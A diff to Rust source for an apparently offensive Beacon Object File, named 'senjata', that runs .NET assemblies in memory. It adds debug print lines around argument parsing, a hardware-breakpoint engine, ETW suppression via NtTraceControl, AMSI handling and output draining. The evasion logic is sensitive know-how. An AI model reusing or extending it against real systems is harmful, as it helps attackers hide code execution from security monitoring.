@@ -47,6 +47,8 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
         // Multi-file mode (a.mode == 1) skips PE parsing — the input is a
         // bundle, not a single assembly. Caller is responsible for binary
         // compatibility. Single-file mode parses normally.
+        rustbof::eprintln!("[dbg] senjata: args ok amsi={} etw={} mode={}", a.amsi as u8, a.etw as u8, a.mode);
+
         let asm_info = if a.mode == 1 {
             pe_parser::AsmInfo { runtime: pe_parser::Runtime::NetFx4 }
         } else {
@@ -57,7 +59,9 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             })?
         };
 
+        rustbof::eprintln!("[dbg] pe parse ok");
         let engine = opsec_hwbp::HwbpEngine::init().map_err(BofError::Hwbp)?;
+        rustbof::eprintln!("[dbg] hwbp engine ok");
         let _etw = if a.etw {
             let ntdll_h = opsec_strcrypt::hash!("ntdll.dll");
             let exp_h = opsec_strcrypt::hash!("NtTraceControl");
@@ -76,7 +80,9 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
             None
         };
 
+        rustbof::eprintln!("[dbg] opening io channel mailslot={}", a.mailslot as u8);
         let mut io_ch = io::IoChannel::open(a.mailslot, &a.slot_name, &a.pipe_name)?;
+        rustbof::eprintln!("[dbg] io channel open ok");
 
         // Slot 3: block AllocConsole unconditionally. The .NET Framework CLR
         // calls AllocConsole when initialising stdio for a console-subsystem PE
@@ -146,26 +152,26 @@ fn run(raw_args: *mut u8, len: usize) -> Result<(), error::BofError> {
                 .install_exit_trap(exit_target as usize, 2, resume_rip, resume_rsp)
                 .map_err(BofError::Hwbp)?;
 
+            rustbof::eprintln!("[dbg] dispatch start");
             let dispatch_result = clr::dispatch(
                 &asm_info, &a.asm_bytes,
                 &a.app_domain, &a.asm_args, a.entry_point,
                 a.mode, &a.main_name,
             );
-            // Path A: normal Main() return. drain() here captures output for
-            // tools that return without calling Environment.Exit(). The call
-            // after the if-block is a no-op (pipe already closed+drained).
+            rustbof::eprintln!("[dbg] dispatch returned path=A ok={}", dispatch_result.is_ok() as u8);
+            // Path A: normal Main() return.
             if let Ok(output) = io_ch.drain() {
+                rustbof::eprintln!("[dbg] drain A bytes={}", output.len());
                 if !output.is_empty() {
                     rustbof::eprintln!("\n{}", output);
                 }
             }
             dispatch_result?;
         }
-        // Path B: Environment.Exit() fired the HWBP trap and jumped here.
-        // .NET flushes Console.Out before calling RtlExitUserProcess, so the
-        // kernel pipe buffer already has all output. drain() reads it now.
-        // For path A this is a safe no-op: write handle is already closed.
+        // Path B: Environment.Exit() trap jumped here. Also a no-op for path A.
+        rustbof::eprintln!("[dbg] drain B start");
         if let Ok(output) = io_ch.drain() {
+            rustbof::eprintln!("[dbg] drain B bytes={}", output.len());
             if !output.is_empty() {
                 rustbof::eprintln!("\n{}", output);
             }
